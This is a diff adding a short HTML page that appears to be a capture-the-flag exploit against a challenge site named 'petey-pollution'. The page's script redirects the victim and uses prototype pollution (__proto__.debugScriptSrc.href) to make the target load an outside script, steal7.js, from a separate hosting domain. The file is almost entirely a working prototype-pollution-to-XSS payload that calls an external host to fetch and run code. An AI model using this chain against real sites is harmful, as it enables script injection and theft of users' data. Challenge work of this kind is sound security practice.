@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        // Redirect to trigger the backend to analyze the Petey page itself with our XSS
+        window.location = 'https://petey-pollution.chall.edgesecurity.team/?url=' + encodeURIComponent('https://petey-pollution.chall.edgesecurity.team/?__proto__.debugScriptSrc.href=https://rushiraj-baxi.github.io/hack/steal7.js');
+    </script>
+</head>
+</html>
